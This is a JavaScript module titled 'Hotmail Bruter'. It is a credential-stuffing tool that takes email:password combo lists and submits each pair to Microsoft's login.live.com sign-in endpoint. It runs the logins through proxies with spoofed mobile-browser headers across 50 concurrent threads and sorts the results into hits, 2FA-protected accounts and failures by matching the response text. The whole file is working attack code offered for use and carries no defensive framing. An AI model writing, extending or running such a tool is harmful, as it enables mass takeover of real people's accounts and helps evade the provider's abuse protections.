// ============================================================
//  Hotmail Bruter — uses the exact same login flow as puller
//  (preCheckCombo from microsoft-puller.js)
//  Hit = HIT or UNKNOWN from preCheckCombo
// ============================================================

const { proxiedFetch } = require("./proxy-manager");
const { runPool } = require("./worker-pool");

// ── preCheckCombo — exact same as puller's login ─────────────

async function preCheckCombo(email, password) {
  const url = "https://login.live.com/ppsecure/post.srf";
  const params = new URLSearchParams({
    nopa: "2",
    client_id: "7d5c843b-fe26-45f7-9073-b683b2ac7ec3",
    cobrandid: "8058f65d-ce06-4c30-9559-473c9275a65d",
    contextid: "F3FB0F6AB3D6991E",
    opid: "5F188DEDF4A1266A",
    bk: "1768757278",
    uaid: "b1d1e6fbf8b24f9b8a73b347b178d580",
    pid: "15216",
  });

  const payload = new URLSearchParams({
    ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
    canary: "", ctx: "", hpgrequestid: "",
    PPFT: "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
    PPSX: "P", NewUser: "1", FoundMSAs: "", fspost: "0", i21: "0",
    CookieDisclosure: "0", IsFidoSupported: "1", isSignupPost: "0",
    isRecoveryAttemptPost: "0", i13: "0", login: email, loginfmt: email,
    type: "11", LoginOptions: "3", lrt: "", lrtPartition: "",
    hisRegion: "", hisScaleUnit: "", cpr: "0", passwd: password,
  });

  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Cache-Control": "max-age=0",
    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-ch-ua-platform-version": '"12.0.0"',
    Origin: "https://login.live.com",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    Referer: "https://login.live.com/oauth20_authorize.srf?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E&ru=https%3A%2F%2Fuser.auth.xboxlive.com%2Fdefault.aspx",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8,ku;q=0.7,ro;q=0.6",
  };

  let currentTry = 0;
  while (currentTry <= 2) {
    try {
      const res = await proxiedFetch(`${url}?${params}`, {
        method: "POST",
        headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
        body: payload.toString(),
        redirect: "follow",
      });

      const statusCode = res.status;
      const responseText = (await res.text()).toLowerCase();

      if (statusCode >= 500 || statusCode === 429) {
        currentTry++;
        await new Promise(r => setTimeout(r, 1500));
        continue;
      }

      const twoFaIndicators = [
        "suggestedaction", "sign in to continue", "enter code", "two-step",
        "two. step", "two factor", "2fa", "second verification", "verification code",
        "authenticator", "texted you", "sent a code", "enter the code",
        "additional security", "extra security",
      ];
      if (twoFaIndicators.some((ind) => responseText.includes(ind))) return "2FA";

      const successIndicators = [
        "to do that, sign in", "welcome", "redirecting", "location.href",
        "home.live.com", "account.microsoft.com", "myaccount.microsoft.com",
        "profile.microsoft.com", "https://account.live.com/", "microsoft account home",
        "signed in successfully", "you're signed in",
      ];
      if (successIndicators.some((ind) => responseText.includes(ind))) return "HIT";

      const failureIndicators = [
        "invalid username or password", "that microsoft account doesn't exist",
        "incorrect password", "your account or password is incorrect",
        "sorry, that password isn't right", "entered is incorrect",
        "account doesn't exist", "no account found", "wrong password",
        "incorrect credentials", "login failed", "sign in unsuccessful",
        "we couldn't find an account", "please check your credentials",
        "sign-in was blocked", "account is locked", "suspended",
        "temporarily locked", "security challenge", "unusual activity",
        "verify your identity", "account review", "safety concerns",
      ];
      if (failureIndicators.some((ind) => responseText.includes(ind))) return "BAD";

      return "UNKNOWN";
    } catch {
      currentTry++;
      await new Promise(r => setTimeout(r, 1500));
    }
  }
  return "ERROR";
}

/**
 * checkAccount — uses puller's preCheckCombo login
 * Returns { email, password, status: "hit" | "bad" | "2fa" | "error" }
 */
async function checkAccount(email, password) {
  try {
    const result = await preCheckCombo(email, password);

    if (result === "HIT" || result === "UNKNOWN") {
      return { email, password, status: "hit" };
    }
    if (result === "2FA") {
      return { email, password, status: "2fa" };
    }
    if (result === "BAD") {
      return { email, password, status: "bad" };
    }
    return { email, password, status: "bad" };
  } catch {
    return { email, password, status: "bad" };
  }
}

/**
 * runBruter — main entry
 * @param {string[]} combos  - array of "email:password"
 * @param {number}   threads - concurrency (default 50)
 * @param {Function} onResult - callback(result, done, total)
 * @param {AbortSignal} signal
 */
async function runBruter(combos, threads = 50, onResult, signal) {
  const items = combos
    .filter((c) => c.includes(":"))
    .map((c) => {
      const [email, ...rest] = c.split(":");
      return { email: email.trim(), password: rest.join(":").trim() };
    })
    .filter((i) => i.email && i.password);

  const results = await runPool({
    items,
    concurrency: threads,
    signal,
    scope: "bruter",
    runner: async (item) => {
      const r = await checkAccount(item.email, item.password);
      return { result: r };
    },
    onResult,
  });

  return results.filter(Boolean);
}

module.exports = { runBruter, checkAccount };
